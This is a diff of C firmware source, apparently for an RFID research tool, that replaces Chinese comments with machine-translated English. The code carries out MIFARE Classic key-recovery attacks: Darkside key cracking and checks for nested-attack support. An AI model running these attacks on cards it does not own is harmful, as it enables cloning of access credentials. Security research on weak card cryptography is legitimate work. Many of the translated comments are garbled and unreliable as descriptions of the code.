@@ -11,20 +11,20 @@
 #include "nrf_log_default_backends.h"
 
 
-// 天线重置的默认延时
+// The default delay of the antenna reset
 static uint32_t g_ant_reset_delay = 8;
 
-// 全局操作使用的标签的信息
+// Label information used for global operations
 static picc_14a_tag_t m_tag_info;
 static picc_14a_tag_t *p_tag_info = &m_tag_info;
 
 
 /**
-* @brief    : 测算随机数的距离值，根据实时算出来的多项式表
-*               官方注释：x,y valid tag nonces, then prng_successor(x, nonce_distance(x, y)) = y
-* @param    :msb : 随机数高位，传出结果由此指针完成
-* @param    :lsb : 随机数低位，传出结果由此指针完成
-* @retval   : 无
+* @brief    : Calculate the distance value of the random number, and calculate the multi -type table based on real -time
+*               Official comment:x,y valid tag nonces, then prng_successor(x, nonce_distance(x, y)) = y
+* @param    :msb :The random number is high, the result is completed, the pointer is completed
+* @param    :lsb :The random number is low, and the result is completed
+* @retval   : none
 *
 */
 void nonce_distance_notable(uint32_t *msb, uint32_t *lsb) {
@@ -32,9 +32,9 @@ void nonce_distance_notable(uint32_t *msb, uint32_t *lsb) {
     uint8_t calc_ok = 0;
 
     for (uint16_t i = 1; i; ++i) {
-        // 计算坐标，以获得多项式的步进运算结果
+        // Calculate coordinates to obtain polynomial step operation results
         pos = (x & 0xff) << 8 | x >> 8;
-        // 判断坐标，我们取出对应的值并且设置以取值的标志位
+        // To judge the coordinates, we take out the corresponding value and set the logo bit with the value of the value
         if ((pos == *msb) & !(calc_ok >> 0 & 0x01)) {
             *msb = i;
             calc_ok |= 0x01;
@@ -43,8 +43,8 @@ void nonce_distance_notable(uint32_t *msb, uint32_t *lsb) {
             *lsb = i;
             calc_ok |= 0x02;
         }
-        // 最终两个值的测算都完成的话，我们直接结束运算，
-        // 以减少不必要的后续CPU性能损耗
+        // If the calculation of both values is completed, we will end the operation directly,
+        // to reduce unnecessary subsequent CPU performance loss
         if (calc_ok == 0x03) {
             return;
         }
@@ -53,25 +53,25 @@ void nonce_distance_notable(uint32_t *msb, uint32_t *lsb) {
 }
 
 /**
-* @brief    : 测算PRNG的步进规律，以验证该随机数是否是可预测的
-*               假若该可预测，那么就可能支持 Darkside攻击
-*               并且可能支持 Nested 攻击
-* @param    :nonce  : 测量的随机数
+* @brief    : Calculate the step of PRNG to verify whether the random number is predictable
+* If it is predictable, then DarkSide attack may be supported
+* And may support Nested attack
+* @param    :nonce  : Measured random number
 * @retval   :   true = weak prng
 *               false = hardend prng
 *
 */
 bool validate_prng_nonce_notable(uint32_t nonce) {
-    // 给出初始的坐标值
+    // Give the initial coordinate value
     uint32_t msb = nonce >> 16;
     uint32_t lsb = nonce & 0xffff;
-    // 传入坐标进行直接运算，并且传出也由传入参数间接传出
+    //The coordinates are passed in direct operation, and the rumors are also indirectly spread by the passing parameters.
     nonce_distance_notable(&msb, &lsb);
     return ((65535 - msb + lsb) % 65535) == 16;
 }
 
 /**
-* @brief    : 重置场，在一定的延时之后重启场
+* @brief    : Re -set the field, restart the field after a certain delay
 *
 */
 static inline void ResetRadioFieldWithDelay(void) {
@@ -81,18 +81,18 @@ static inline void ResetRadioFieldWithDelay(void) {
 }
 
 /**
-* @brief    : 发送mifare指令
-* @param    :pcs     : crypto1句柄
-* @param    :crypted : 这批数据是否需要被 crypto1 加密
-* @param    :cmd     : 将被发送的指令，例如 0x60 表示验证 A 秘钥
-* @param    :data    : 将被发送的数据，例如 0x03 表示验证 1 扇区
-* @param    :answer  : 卡片的应答数据存放的数组
-* @param    :answer_parity  : 卡片的应答数据的奇偶校验位存放的数组
-* @retval   : 卡片应答的数据的长度，这个长度是 bit 长度，不是 byte长度
+* @brief    : Send the MiFare instruction
+* @param    :pcs     : crypto1st handle
+* @param    :crypted : Whether these data need to be encrypted by Crypto1
+* @param    :cmd     : The instructions that will be sent, for example, 0x60 indicates verification A key
+* @param    :data    : The data that will be sent, such as 0x03 indicates verification 1 sector
+* @param    :answer  : Card response data stored array
+* @param    :answer_parity  : Card response data for the stagnant school inspection storage
+* @retval   : The length of the card response data, this length is the length of the bit, not the length of Byte
 *
 */
 uint8_t sendcmd(struct Crypto1State *pcs, uint8_t crypted, uint8_t cmd, uint8_t data, uint8_t *status, uint8_t *answer, uint8_t *answer_parity, uint16_t answer_max_bit) {
-    // 这里我们直接设置为静态
+    // Here we set directly to static
     static uint8_t pos;
     static uint16_t len;
     static uint8_t dcmd[4];
@@ -134,7 +134,7 @@ uint8_t sendcmd(struct Crypto1State *pcs, uint8_t crypted, uint8_t cmd, uint8_t 
                   );
     }
 
-    // 通信有问题，不继续接下来的任务
+    // There is a problem with communication, do not continue the next task
     if (*status != HF_TAG_OK) {
         return len;
     }
@@ -157,22 +157,22 @@ uint8_t sendcmd(struct Crypto1State *pcs, uint8_t crypted, uint8_t cmd, uint8_t 
 }
 
 /**
-* @brief    : 高级验证过程
-* @param    :pcs      : crypto1句柄
-* @param    :uid      : 卡片的UID号
-* @param    :blockNo  : 验证的块号
-* @param    :keyType  : 秘钥类型, 0x60(A秘钥) 或者 0x61(B秘钥)
-* @param    :ui64Key  : 卡片的秘钥的U64值
-* @param    :isNested : 当前是否是嵌套验证
-* @param    :ntptr    : 存放NT的地址，如果传入 NULL ，则不保存NT
-* @retval   : 验证成功返回 0 ，验证不成功返回非 0 值
+* @brief    : Advanced verification process
+* @param    :pcs      : crypto1st handle
+* @param    :uid      : Card's UID number
+* @param    :blockNo  : Verified block number
+* @param    :keyType  : Type type, 0x60 (A key) or 0x61 (B secret)
+* @param    :ui64Key  : The U64 value of the secret of the card
+* @param    :isNested : Is it currently nested verification?
+* @param    :ntptr    : Store the address of NT, if it is passed into NULL, it will not be saved
+* @retval   : Verification returns 0, the verification is unsuccessful to return the non -0 value
 *
 */
 int authex(struct Crypto1State *pcs, uint32_t uid, uint8_t blockNo, uint8_t keyType, uint64_t ui64Key, uint8_t isNested, uint32_t *ntptr) {
     static uint8_t status;                                      // tag resonse status
     static uint16_t len;                                        // tag resonse length
     static uint32_t pos, nt, ntpp;                              // Supplied tag nonce
-    static const uint8_t nr[]   = { 0x12, 0x34, 0x56, 0x78 };   // 使用固定的卡片随机数 NR，也就是Nonce Reader。
+    static const uint8_t nr[]   = { 0x12, 0x34, 0x56, 0x78 };   // Use a fixed card to random NR, which is Nonce Reader.
     uint8_t par[]               = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
     uint8_t mf_nr_ar[]          = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
     uint8_t answer[]            = { 0x00, 0x00, 0x00, 0x00 };
@@ -223,38 +223,38 @@ int authex(struct Crypto1State *pcs, uint32_t uid, uint8_t blockNo, uint8_t keyT
         par[pos] = filter(pcs->odd) ^ oddparity8(nt);
     }
 
-    // 我们不需要status，因为正常的通信会返回 32bit 的数据
+    // We don't need Status, because normal communication will return 32bit data
     pcd_14a_reader_bits_transfer(mf_nr_ar, 64, par, answer, parity, &len, U8ARR_BIT_LEN(answer));
     if (len == 32) {
         ntpp = prng_successor(nt, 32) ^ crypto1_word(pcs, 0, 0);
         if (ntpp == BYTES4_TO_U32(answer)) {
-            // 验证成功！
+            // Successful verification!
             return HF_TAG_OK;
         } else {
-            // 失败
+            // fail
             return MF_ERRAUTH;
         }
     }
 
-    // 失败！
+    // fail!
     return MF_ERRAUTH;
 }
 
 /**
-* @brief    : 选定出现几率最大的一个NT
-* @param    :tag             : 标签信息结构体，快速选卡需要使用此结构体
-* @param    :block           : 将被攻击的密钥块
-* @param    :keytype         : 将被攻击的密钥类型
-* @param    :nt              : 最终选定的NT，这个NT是出现次数最多，且排名最靠前的
-* @retval 最终确定下来的NT值， 如果无法同步卡片时钟，返回对应的异常码，否则返回 HF_TAG_OK
+* @brief    : Selected the largest probability of NT
+* @param    :tag             : Label information structure, fast selection card needs to use this structure
+* @param    :block           : The key cubes that will be attacked
+* @param    :keytype         : The type of key to be attacked
+* @param    :nt              : The final selected NT, this NT is the most occurred, and the ranking is the highest.
+* @retval The final NT value determined, if the card clock cannot be synchronized, returns the corresponding abnormal code, otherwise return hf_tag_ok
 * -------------------
-* 为何无法固定随机数？
-*   0、卡片天线位置有自由或者非自由移动的偏差导致通信不稳定。
-*   1、所处电磁环境非常复杂，导致卡片上电充能到完成通信的过程无法稳定重放
-*   2、卡片针对重放攻击做了漏洞修复，卡片不再被重放攻击套取相同应答
-*   3、此代码所运行的环境非裸机或中断太频繁，或其他任务调度太频繁，
-*       导致 CPU 无法在稳定的相同的时间内完成重放攻击。
-*       此种情况基本无解，建议将此段代码之外的非关键中断以及任务调度关闭
+* Why can't you fix the random number?
+* 0. The deviation of free or non -free movement in the card antenna leads to the unstable communication.
+* 1. The electromagnetic environment where it is located is very complicated, resulting in the process of getting the power charging of the card to complete the communication.
+* 2. The card is repaired for the loopholes for the heavy attack attack, and the card is no longer a replaceable attack set to take the same response
+* 3. The environment run by this code is too frequent or interrupt, or other task scheduling is too frequent.
+* As a result, the CPU cannot complete the replay attack within the same time.
+* There is basically no solution in this situation. It is recommended to close the non -critical interruption and task scheduling outside this code
 */
 uint8_t Darkside_Select_Nonces(picc_14a_tag_t *tag, uint8_t block, uint8_t keytype, uint32_t *nt) {
 #define NT_COUNT 15
@@ -267,30 +267,30 @@ uint8_t Darkside_Select_Nonces(picc_14a_tag_t *tag, uint8_t block, uint8_t keyty
 
     crc_14a_append(tag_auth, 2);
 
-    // 进行随机数采集
+    //Random number collection
     for (i = 0; i < NT_COUNT; i++) {
-        // 在进行天线重置时，我们必须要确保
-        // 1、天线断电足够久，以此确保卡片完全断电，否则无法重置卡片的伪随机数生成器
-        // 2、断电时间适中，不要太长，会影响效率，也不要太短，会无法无法重置卡片
+        //When the antenna is reset, we must make sure
+        // 1. The antenna is powered off for a long time to ensure that the card is completely powered off, otherwise the pseudo -random number generator of the card cannot be reset
+        // 2. Moderate power -off time, don't be too long, it will affect efficiency, and don't be too short.
         ResetRadioFieldWithDelay();
-        // 完全断电后，我们进行快速选卡，尽可能的将验证耗时压缩
+        // After the power is completely disconnected, we will select the card quickly and compress the verification time as much as possible.
         if (pcd_14a_reader_scan_auto(tag) != HF_TAG_OK) {
             NRF_LOG_INFO("Tag can't select!\n");
             return HF_TAG_NO;
         }
         status = pcd_14a_reader_bytes_transfer(PCD_TRANSCEIVE, tag_auth, 4, tag_resp, &len, U8ARR_BIT_LEN(tag_resp));
-        // 在寻找到卡片后，开始采集随机数
+        // After finding the card, start collecting random numbers
         if (status != HF_TAG_OK || len != 32) {
             NRF_LOG_INFO("Get nt failed.\n");
             return HF_ERRSTAT;
         }
-        // 转换为u32的类型，并且进行缓存
+        // Converted to the type of U32 and cache
         nt_list[i] = bytes_to_num(tag_resp, 4);
-        // 转换应答的字节数组为10进制的NT
+        // The byte array of the conversion response is 10 in NT
         // NRF_LOG_INFO("Get nt: %"PRIu32"\r\n", nt_list[i]);
     }
 
-    // 对随机数进行取重
+    // Take the random number
     for (i = 0; i < NT_COUNT; i++) {
         uint32_t nt_a = nt_list[i];
         for (m = i + 1; m < NT_COUNT; m++) {
@@ -301,7 +301,7 @@ uint8_t Darkside_Select_Nonces(picc_14a_tag_t *tag, uint8_t block, uint8_t keyty
         }
     }
 
-    // 对取重后的最大次数值进行取值
+    // Take the maximum number of times after weighting
     max = nt_count[0];
     m = 0;
     for (i = 1; i < NT_COUNT; i++) {
@@ -311,83 +311,83 @@ uint8_t Darkside_Select_Nonces(picc_14a_tag_t *tag, uint8_t block, uint8_t keyty
         }
     }
 
-    // 最终，我们判定一下max次数是否大于0，
-    // 如果不大于0，说明无法同步时钟。
+    //In the end, let's determine whether the number of MAX times is greater than 0,
+    // If it is not greater than 0, it means that the clock cannot be synchronized.
     if (max == 0) {
         NRF_LOG_INFO("Can't sync nt.\n");
         return DARKSIDE_CANT_FIXED_NT;
     }
 
-    // NT 固定成功，我们取出出现次数最高的那个
+    // NT is fixed successfully, the one with the highest number of times we take out
     // NRF_LOG_INFO("Sync nt: %"PRIu32", max = %d\n", nt_list[m], max);
-    if (nt) *nt = nt_list[m];  // 只有调用者需要获得NT时才传出
+    if (nt) *nt = nt_list[m];  // Only when the caller needs to get NT
     return HF_TAG_OK;
 }
 
 /**
-* @brief    : 使用Darkside漏洞破解一个未知的密钥
-* @param    :dc : darkside破解的核心应答
-* @param    :dp : darkside破解的核心参数
-* @retval   : 收集成功返回 HF_TAG_OK ，验证不成功返回对应的异常码
+* @brief    : Using darkside vulnerability to crack an unknown key
+* @param    :dc : DarkSide's core response
+* @param    :dp : The core parameter of darkside cracking
+* @retval   : Collect successfully returning hf_tag_ok, verify that the corresponding abnormal code is not successfully returned
 *
 */
 uint8_t Darkside_Recover_Key(uint8_t targetBlk, uint8_t targetTyp,
                              uint8_t firstRecover, uint8_t ntSyncMax, DarksideCore *dc) {
 
-    // 被固定使用的卡片信息
+    // Card information for fixed use
     static uint32_t uid_ori                 = 0;
     uint32_t uid_cur                        = 0;
 
-    // 被固定随机数和每次获得的随机数
+    // Fixed random number and random number of each time
     static uint32_t nt_ori                  = 0;
     uint32_t nt_cur                         = 0;
 
-    // mr_nr 生成时每次的变化量
+    // Mr_nr changes every time
     static uint8_t par_low                  = 0;
     static uint8_t mf_nr_ar3                = 0;
 
-    // 卡片交互通信                         哇塞，好整齐的变量定义
+    // Card interaction communication                         Wow, so neat variable definition
     uint8_t tag_auth[4]                     = { targetTyp, targetBlk, 0x00, 0x00 };
     uint8_t par_list[8]                     = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
     uint8_t ks_list[8]                      = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
     uint8_t mf_nr_ar[8]                     = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
 
-    // 真正通信的时候，全程8个byte的长度足够容纳所有的数据
+    // During the real communication, the length of 8 byte is enough to accommodate all data
     uint8_t par_byte[8]                     = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
     uint8_t dat_recv[8]                     = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
 
-    // 控制变量
-    uint8_t resync_count                    = 0x00;  // 这个变量负责统计当前同步时钟以同步NT的尝试次数
-    uint8_t received_nack                   = 0x00;  // 这个变量负责标志当前是否接收到了NACK的回复
-    uint8_t par                             = 0x00;  // 这个变量负责奇偶校验位的递增，以碰撞卡片的回复
-    uint8_t status                          = 0x00;  // 这个变量负责保存卡片通信的状态
-    uint16_t len                            = 0x00;  // 这个变量负责保存通信过程中卡片的数据应答长度
-    uint8_t nt_diff                         = 0x00;  // 这个变量很关键哦，别不初始化，因为下面直接使用了
+    // Control variable
+    uint8_t resync_count                    = 0x00;  // This variable is responsible for counting the current sync clock with the number of attempts of synchronous NT
+    uint8_t received_nack                   = 0x00;  // This variable is responsible for whether it receives the reply from Nack
+    uint8_t par                             = 0x00;  // This variable is responsible for increasing the puppet school inspection, and the reply of the collision card
+    uint8_t status                          = 0x00;  // This variable is responsible for saving card communication status
+    uint16_t len                            = 0x00;  // This variable is responsible for saving the data of the card in the communication process to respond to the length of the card
+    uint8_t nt_diff                         = 0x00;  // This variable is critical, don't initialize it, because the following is used directly
 
-    // 我们需要先确认使用某一张卡
+    // We need to confirm the use of a certain card first
     if (pcd_14a_reader_scan_auto(p_tag_info) == HF_TAG_OK) {
         uid_cur = get_u32_tag_uid(p_tag_info);
     } else {
         return HF_TAG_NO;
     }
 
-    // 验证指令需要追加CRC16
+    // Verification instructions need to add CRC16
     crc_14a_append(tag_auth, 2);
 
-    // 初始化静态变量如果是第一次发起攻击
+    // Initialize the static variable if it is the first attack
     if (firstRecover) {
-        // 重置关键变量
+        // Reset key variable
         nt_ori      = 0;
         mf_nr_ar3   = 0;
         par_low     = 0;
 
-        // 第一次运行的话，我们需要固定使用一个卡片
+        // For the first time, we need to use a card fixed
         uid_ori = get_u32_tag_uid(p_tag_info);
 
-        // 然后还需要固定一个大概率出现的随机数
+        // Then you need to fix a random number that may appear
         status = Darkside_Select_Nonces(p_tag_info, targetBlk, targetTyp, &nt_ori);
         if (status != HF_TAG_OK) {
-            // 固定随机数失败，无法进行下一步操作
+            //The fixed random number failed, and the next step cannot be performed
             return status;
         }
     } else {
@@ -402,17 +402,17 @@ uint8_t Darkside_Recover_Key(uint8_t targetBlk, uint8_t targetTyp,
         }
     }
 
-    // 在一个大循环里面一直采集不同的nr ar下的nack
+    // Always collect different NACK under a large cycle
     do {
-        // 重置nack的接收标志
+        // Reset the receiving sign of NACK
         received_nack = 0;
 
-        // 在进行天线重置时，我们必须要确保
-        // 1、天线断电足够久，以此确保卡片完全断电，否则无法重置卡片的伪随机数生成器
-        // 2、断电时间适中，不要太长，会影响效率，也不要太短，会无法无法重置卡片
+        //When the antenna is reset, we must make sure
+        // 1. The antenna is powered off for a long time to ensure that the card is completely powered off, otherwise the pseudo -random number generator of the card cannot be reset
+        // 2. Moderate power -off time, don't be too long, it will affect efficiency, and don't be too short.
         ResetRadioFieldWithDelay();
 
-        // 完全断电后，我们进行快速选卡，尽可能的将验证耗时压缩
+        //After the power is completely disconnected, we will select the card quickly and compress the verification time as much as possible.
         if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
             NRF_LOG_INFO("Tag can't select!\n");
             return HF_TAG_NO;
@@ -420,37 +420,37 @@ uint8_t Darkside_Recover_Key(uint8_t targetBlk, uint8_t targetTyp,
 
         status = pcd_14a_reader_bytes_transfer(PCD_TRANSCEIVE, tag_auth, 4, dat_recv, &len, U8ARR_BIT_LEN(dat_recv));
 
-        // 在寻找到卡片后，开始采集随机数
+        // After finding the card, start collecting random numbers
         if (status != HF_TAG_OK || len != 32) {
             NRF_LOG_INFO("Get nt failed.\n");
             return HF_ERRSTAT;
         }
 
-        // 转换应答的字节数组为10进制的 NT
+        //The byte array of the conversion response is 10 in NT
         nt_cur = bytes_to_num(dat_recv, 4);
         // NRF_LOG_INFO("Get nt: %"PRIu32"\r\n", nt_cur);
 
-        // 判断时钟同步（使NT固定）
+        //Determine the clock synchronization (fixing NT)
         if (nt_cur != nt_ori) {
-            // 随机数不同步，但是我们已经选择过随机数了
-            // 并且我们选择的随机数也被成功的重放攻击了
-            // 也就说，这种误差，已经没机会修正随机数了
+            // The random number is not synchronized, but we have chosen the random number
+            // And the random number we chose was also successfully attacked
+            // In other words, this error has no chance to correct the random number
             if (++resync_count == ntSyncMax) {
                 NRF_LOG_INFO("Can't fix nonce.\r\n");
                 return DARKSIDE_CANT_FIXED_NT;
             }
 
-            // 时钟不同步的情况下，下面的操作是没意义的
-            // 因此直接跳过下面的操作，进入下一轮循环，
-            // 上帝保佑下一轮循环能同步时钟。。。
+            // When the clock is not synchronized, the following operation is meaningless
+            // So directly skip the following operations, enter the next round of cycle,
+            // God bless the next cycle to synchronize the clock.EssenceEssence
             // NRF_LOG_INFO("Sync nt -> nt_fix: %"PRIu32", nt_new: %"PRIu32"\r\n", nt_ori, nt_cur);
             continue;
         }
 
-        // 本来我们只需要发 par 的，利用其中的每一个Bit当做校验位来的
-        // 但是奈何我们实现的发送函数只支持以一个uint8_t，也就是一个字节当做一个bit来用
-        // 因此此处我们需要把 PM3 的通信写法换成我们的。
-        // 这里反正次数不多，我们直接展开换算的代码
+        //Originally, we only need to send PAR, and use every bit of them as a school test.
+        // But the sending function we implemented only supports one UINT8_T, that is, a byte as a bit
+        // Therefore, we need to replace the communication writing of PM3 into our.
+        // There are not many times here anyway, we directly expand the code for conversion
         par_byte[0] = par >> 0 & 0x1;
         par_byte[1] = par >> 1 & 0x1;
         par_byte[2] = par >> 2 & 0x1;
@@ -463,7 +463,7 @@ uint8_t Darkside_Recover_Key(uint8_t targetBlk, uint8_t targetTyp,
         len = 0;
         pcd_14a_reader_bits_transfer(mf_nr_ar, 64, par_byte, dat_recv, par_byte, &len, U8ARR_BIT_LEN(dat_recv));
 
-        // 重置固定随机数上限计数
+        //Reset fixed random number upper limit count
         resync_count = 0;
 
         if (len == 4) {
@@ -511,8 +511,8 @@ uint8_t Darkside_Recover_Key(uint8_t targetBlk, uint8_t targetTyp,
 
     mf_nr_ar[3] &= 0x1F;
 
-    // 没有出现意外情况，本次执行判定为成功！
-    // 我们需要对结果进行封装返回
+    // There is no accident, this execution is judged as success!
+    // We need to package the result and return
 
     get_4byte_tag_uid(p_tag_info, dc->uid);
     num_to_bytes(nt_cur, 4, dc->nt);
@@ -526,11 +526,11 @@ uint8_t Darkside_Recover_Key(uint8_t targetBlk, uint8_t targetTyp,
 }
 
 /**
-* @brief    : 修改天线重启的中间延时
-*               延时越长，越能重启某些非标卡片，
-*               延时越短，越块处理天线重启过程，进而处理后续业务
-* @param    :delay_ms   : 延时的具体值，单位为毫秒
-* @retval   : 无
+* @brief    : Modify the middle delay of the antenna restart
+*               The longer the delay, the more you can restart certain non -standard cards, the more
+*               The shorter the delay, the more you get the process of processing the antenna restart, and then deal with the follow -up business
+* @param    :delay_ms   : The specific value of the delay, the unit is milliseconds
+* @retval   : none
 *
 */
 void Atenna_Switch_Delay(uint32_t delay_ms) {
@@ -538,26 +538,26 @@ void Atenna_Switch_Delay(uint32_t delay_ms) {
 }
 
 /**
-* @brief    : 判断此卡片是否支持Darkside攻击
-* @retval   : 如果支持，返回 HF_TAG_OK，如果不支持，
-*               返回检测过程中发生异常的结果码：
-*                   1、DARKSIDE_CANT_FIXED_NT
-*                   2、DARKSIDE_NACK_NO_SEND
-*                   3、DARKSIDE_TAG_CHANGED
-*               或者其他的卡片相关的通信错误，最常见的是丢失卡片 HF_TAG_NO
+* @brief    :Determine whether this card supports DARKSIDE attack
+* @retval   : If support, return hf_tag_ok, if it is not supported,
+* Return to the results of abnormal results during the detection process:
+*                   1. DARKSIDE_CANT_FIXED_NT
+*                   2. DARKSIDE_NACK_NO_SEND
+*                   3. DARKSIDE_TAG_CHANGED
+*              Or other card -related communication errors, the most common is loss card HF_TAG_NO
 *
 */
 uint8_t Check_Darkside_Support() {
-    // 实例化参数
+    // Instantiated parameter
     DarksideCore dc;
-    // 直接判断并且返回结果
+    //Determine and return the result directly
     return Darkside_Recover_Key(0x03, PICC_AUTHENT1A, true, 0x15, &dc);
 }
 
 /**
-* @brief    : 判断此卡片是否支持M1的验证步骤
-* @retval   : 如果支持，将返回HF_TAG_OK，
-*               如果不支持，则返回对应的错误码
+* @brief    : Determine whether this card supports M1 verification steps
+* @retval   : If support, it will return hf_tag_ok,
+*              If it is not supported, returns the corresponding error code
 *
 */
 uint8_t Check_Tag_Response_NT(picc_14a_tag_t *tag, uint32_t *nt) {
@@ -567,16 +567,16 @@ uint8_t Check_Tag_Response_NT(picc_14a_tag_t *tag, uint32_t *nt) {
     uint8_t dat_recv[4]                 = { 0x00 };
     uint8_t status;
 
-    // 重置卡片通信
+    // Reset card communication
     pcd_14a_reader_halt_tag();
 
-    // 我们进行快速选卡，尽可能的将验证耗时压缩
+    // We will choose a fast card, and we will be compressed to verify as much as possible
     if (pcd_14a_reader_scan_auto(tag) != HF_TAG_OK) {
         NRF_LOG_INFO("Tag can't select\r\n");
         return HF_TAG_NO;
     }
 
-    // 发送指令并且获取NT返回
+    // Send instructions and get NT return
     *nt = sendcmd(pcs, AUTH_FIRST, PICC_AUTHENT1A, 0x03, &status, dat_recv, par_recv, U8ARR_BIT_LEN(dat_recv));
     if (*nt != 32) {
         // dbg_block_printf("No 32 data recv on sendcmd: %d\n", *nt);
@@ -587,59 +587,58 @@ uint8_t Check_Tag_Response_NT(picc_14a_tag_t *tag, uint32_t *nt) {
 }
 
 /**
-* @brief    : 判断此卡片是否支持标签MF三次验证协议
-* @retval   : 如果支持，返回 HF_TAG_OK，如果不支持，
-*               则返回 HF_ERRSTAT
-*               或者其他的卡片相关的通信错误，最常见的是
-*               丢失卡片 HF_TAG_NO 和错误的状态 HF_ERRSTAT
+* @brief    : Determine whether this card supports the label MF three verification protocols
+* @retval   : If support, return hf_tag_ok, if it is not supported,
+*             Then return hf_errstat
+* Or other card -related communication errors, the most common thing is
+* Lost card hf_tag_no and wrong status hf_errstat
 *
 */
 uint8_t Check_STDMifareNT_Support() {
     uint32_t nt1 = 0;
 
-    // 寻卡，场内搜索
+    // Find card, search on the field
     if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
         return HF_TAG_NO;
     }
 
-    // 获取NT
+    // Get NT
     return Check_Tag_Response_NT(p_tag_info, &nt1);
 }
 
 /**
-* @brief    : 判断此卡片是否支持StaticNested攻击
-* @retval   : 如果支持，返回 NESTED_TAG_IS_STATIC，如果不支持，
-*               则返回 HF_TAG_OK
-*               或者其他的卡片相关的通信错误，最常见的是丢失卡片 HF_TAG_NO
+* @brief    :Determine whether this card supports StaticNESTED attack
+* @retval   : If support, return nested_tag_is_static, if it is not supported, if support, return nested_tag_is_static, if it is not supported, if it is not supported, it is not supported,
+* If support, return nested_tag_is_static, if not support,
 *
 */
 uint8_t Check_StaticNested_Support() {
     uint32_t nt1, nt2;
     uint8_t status;
 
-    // 寻卡，场内搜索
+    // Find card, search on the field
     if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
         return HF_TAG_NO;
     }
 
-    // 第一波获取NT
+    // Get NT in the first wave
     status = Check_Tag_Response_NT(p_tag_info, &nt1);
     if (status != HF_TAG_OK) {
         return status;
     }
 
-    // 获取完成后谨记重置场
-    // 如果不重置场的话，某些卡会在场内维持功能时一直提供一个静态的NT
-    // 因此此处的重置非常重要。
+    // Remember to reset the place after getting completed
+    // If you do not re -set the field, some cards will always provide a static NT when maintaining the function in the field
+    // Therefore, resetting here is very important.
     ResetRadioFieldWithDelay();
 
-    // 第二波获取NT
+    // Get NT in the second wave
     status = Check_Tag_Response_NT(p_tag_info, &nt2);
     if (status != HF_TAG_OK) {
         return status;
     }
 
-    // 检测随机数是否是静态的
+    // Detect whether the random number is static
     if (nt1 == nt2) {
         return NESTED_TAG_IS_STATIC;
     }
@@ -648,8 +647,8 @@ uint8_t Check_StaticNested_Support() {
 }
 
 /**
-* @brief    : 判断此卡片是否支持最普通，最弱，最容易的prng攻击
-* @retval   : 判断结果
+* @brief    : Determine whether this card supports the most common, weaker, and easiest Prite attack
+* @retval   : critical result
 *
 */
 uint8_t Check_WeakNested_Support() {
@@ -658,37 +657,37 @@ uint8_t Check_WeakNested_Support() {
 
     status = Check_StaticNested_Support();
 
-    // 如果判断的过程中，发现并不能完成staticnested的检测
-    // 那就直接返回状态，不需要进行下面的判断逻辑了。
+    // If the judgment process is found, it is found that the Staticnested detection cannot be completed
+    // Then return the state directly, no need to perform the following judgment logic.
     if (status != HF_TAG_OK) {
         return status;
     }
 
-    // 非static的卡片，还可以继续往下跑逻辑
+    // Non -Static card, you can continue to run down logic
     // ------------------------------------
 
-    // 每次重新操作前，都尝试休眠标签
-    // 以重置其可能有问题的状态机
+    // Before you re -operate, try a dormant label
+    // to reset the state machine where it may have problems
     pcd_14a_reader_halt_tag();
 
-    // 进行寻卡操作
+    // Card search operation
     if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
         return HF_TAG_NO;
     }
 
-    // 获取NT，只需要获取一次
+    //Get NT, just get it once
     status = Check_Tag_Response_NT(p_tag_info, &nt1);
     if (status != HF_TAG_OK) {
         return status;
     }
 
-    // 测算NT的有效性
+    //Calculate the effectiveness of NT
     if (validate_prng_nonce_notable(nt1)) {
         // NRF_LOG_INFO("The tag support Nested\n");
         return HF_TAG_OK;
     }
     // NRF_LOG_INFO("The tag support HardNested\n");
-    // NT不可预测，无效。
+    // NT is unpredictable and invalid.
 
     // ------------------------------------
     // end
@@ -697,26 +696,26 @@ uint8_t Check_WeakNested_Support() {
 }
 
 /**
-* @brief    : 计算两个随机数的距离
-* @param    :from   : 从哪个随机数开始
-* @param    :to     : 到哪个随机数结束
-* @retval   : 距离值
+* @brief    : Calculate the distance between the two random numbers
+* @param    :from   : From which random number
+* @param    :to     :Which random number is over
+* @retval   : Distance value
 *
 */
 uint32_t measure_nonces(uint32_t from, uint32_t to) {
-    // 给出初始的坐标值
+    // Give the initial coordinate value
     uint32_t msb = from >> 16;
     uint32_t lsb = to >> 16;
-    // 传入坐标进行直接运算，并且传出也由传入参数间接传出
+    // The coordinates are passed in direct operation, and the rumors are also indirectly spread by the passing parameters.
     nonce_distance_notable(&msb, &lsb);
     return (65535 + lsb - msb) % 65535;
 }
 
 /**
-* @brief    : 中间值测量
-* @param    :src    : 测量源
-* @param    :length : 测量源的个数
-* @retval   : 中间值
+* @brief    : Intermediate value measurement
+* @param    :src    :Measurement source
+* @param    :length :The number of measurement sources
+* @retval   : Median
 *
 */
 uint32_t measure_medin(uint32_t *src, uint32_t length) {
@@ -729,7 +728,7 @@ uint32_t measure_medin(uint32_t *src, uint32_t length) {
     }
 
     for (i = 0; i < len; i++) {
-        // i是已排列的序列的末尾
+        //i is the end of the sequence that has been arranged
         minIndex = i;
         for (int j = i + 1; j < len; j++) {
             if (src[j] < src[minIndex]) {
@@ -746,12 +745,12 @@ uint32_t measure_medin(uint32_t *src, uint32_t length) {
 }
 
 /**
-* @brief    : 进行Nested攻击前要测量距离，如果距离合适，则可以快速破解
-* @param    :u64Key  : 卡片的秘钥的U64值
-* @param    :block    : 验证的块号
-* @param    :type     : 秘钥类型, 0x60(A秘钥) 或者 0x61(B秘钥)
-* @param    :distance : 最终的距离
-* @retval   : 操作结果
+* @brief    :The distance should be measured before the Nested attack. If the distance is appropriate, you can quickly crack
+* @param    :u64Key  : The U64 value of the secret of the card
+* @param    :block    :Verified block number
+* @param    :type     :Type type, 0x60 (A key) or 0x61 (B secret)
+* @param    :distance : Final distance
+* @retval   : Operating result
